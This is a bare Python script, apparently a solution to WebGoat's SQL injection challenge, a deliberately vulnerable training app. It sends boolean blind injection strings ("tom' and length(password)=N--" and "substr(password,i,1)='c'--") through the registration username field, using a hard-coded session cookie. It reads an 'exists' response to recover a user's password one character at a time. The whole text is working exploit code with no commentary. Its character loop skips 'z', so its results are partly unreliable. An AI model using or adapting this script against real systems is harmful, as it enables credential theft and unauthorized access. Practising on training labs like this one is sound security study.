import requests,re



password =""

leng = ""

url = "http://192.168.35.20:8080/WebGoat/SqlInjection/challenge"

cookie = {'JSESSIONID':'9B495EAE196DEA2966CF54CCA460DDB7'}



for i in range(1,100):

    print("%d password length..."%i)

    query = "tom' and length(password)=%d--"%i

    data = {'username_reg':query,'email_reg':'1@1','password_reg':'1','confirm_password_reg':'1'}

    

    res = requests.put(url,data,cookies=cookie)

    sts = str(res.content)

    ok = re.findall("exists",sts)

    

    if ok:

        leng = i

        break



for i in range(1,leng+1):

    print("%d password.."%i)

    for j in range(0x61,0x7A):

        query = "tom' and substr(password,%d,1)='%c'--"%(i,chr(j))

        data = {'username_reg':query,'email_reg':'1@1','password_reg':'1','confirm_password_reg':'1'}

        

        res = requests.put(url,data,cookies=cookie)

        sts = str(res.content)        

        ok = re.findall("exists",sts)

        

        if ok:

            password = password + chr(j)

            print("password:"+password)

            break



print ("password length : %d, password: %s"%(leng,password))